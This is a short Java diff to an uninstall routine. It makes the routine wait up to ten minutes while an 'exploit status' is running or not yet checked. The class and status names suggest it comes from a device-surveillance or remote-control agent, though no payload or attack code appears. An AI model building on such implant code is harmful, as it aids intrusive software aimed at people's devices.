@@ -72,13 +72,13 @@ public class UninstallAction extends SubActionSlow {
 			Status.uninstall = true;
 			// check Core.taskInit
 			Core.self().createUninstallMarkup();
-			if(Status.getExploitStatus()==Status.EXPLOIT_STATUS_RUNNING) {
+			if(Status.getExploitStatus()<=Status.EXPLOIT_STATUS_RUNNING) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (actualExecute), exploit still running...you have to wait");
+					Check.log(TAG + " (actualExecute), exploit still running or not checked...you have to wait");
 				}
 				//wait max 10minutes
 				int seconds2try = 600;
-				while (waitExploit && Status.getExploitStatus() == Status.EXPLOIT_STATUS_RUNNING){
+				while (waitExploit && Status.getExploitStatus() <= Status.EXPLOIT_STATUS_RUNNING){
 					Check.log(TAG + " (actualExecute).");
 					try {
 						Thread.sleep(1000);
